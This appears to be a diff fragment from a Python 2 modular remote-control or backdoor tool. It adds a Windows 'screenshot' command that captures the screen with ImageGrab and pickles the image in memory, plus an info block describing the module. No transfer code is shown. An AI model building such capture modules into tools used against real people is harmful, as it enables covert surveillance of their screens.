@@ -12,3 +12,13 @@ def screenshot():
     im = ImageGrab.grab()
     bytes = pickle.dumps(im)
 ''')
+        config.logics.append('''
+elif command == "screenshot":
+            screenshot()''')
+
+    elif option == 'info':
+        print '\nName             : In-memory Screenshot component' \
+              '\nOS               : Windows' \
+              '\nRequired Modules : pyscreenshot, pickle' \
+              '\nCommands         : screenshot' \
+              '\nDescription      : This module takes a screenshot and stores it in-memory'
